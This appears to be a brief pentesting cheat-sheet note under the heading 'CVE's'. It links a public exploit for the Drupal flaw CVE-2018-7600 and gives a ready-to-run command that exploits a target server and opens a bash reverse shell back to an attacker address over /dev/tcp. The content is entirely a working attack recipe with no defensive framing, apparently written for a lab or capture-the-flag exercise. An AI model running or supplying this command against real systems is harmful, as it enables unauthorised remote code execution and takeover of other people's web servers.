# CVE’s

`To get a reverse shell:` https://github.com/pimps/CVE-2018-7600

```bash
python3 drupa7-CVE-2018-7600.py -c 'bash -c "bash -i &>/dev/tcp/10.20.30.10/1337 <&1"' http://10.20.30.12/
```